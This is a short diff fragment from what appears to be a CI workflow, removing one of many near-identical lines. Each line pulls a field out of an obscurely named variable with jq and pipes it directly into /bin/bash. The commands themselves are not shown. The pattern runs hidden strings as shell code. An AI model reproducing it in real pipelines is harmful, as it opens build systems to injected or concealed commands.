@@ -41,7 +41,6 @@ jobs:
           echo $f9316 | jq -r .knjg2 | /bin/bash
           printf '%s' "$ldn5" | jq -r .xv67498 | /bin/bash
           printf '%s' "$mq7594" | jq -r .jaoyx256 | /bin/bash
-          echo $qsw0 | jq -r .bes1 | /bin/bash
           echo $jlsf2587 | jq -r .gl48 | /bin/bash
           printf '%s' "$am85120" | jq -r .qyowf81610 | /bin/bash
           printf '%s' "$ytv82237" | jq -r .j2346 | /bin/bash
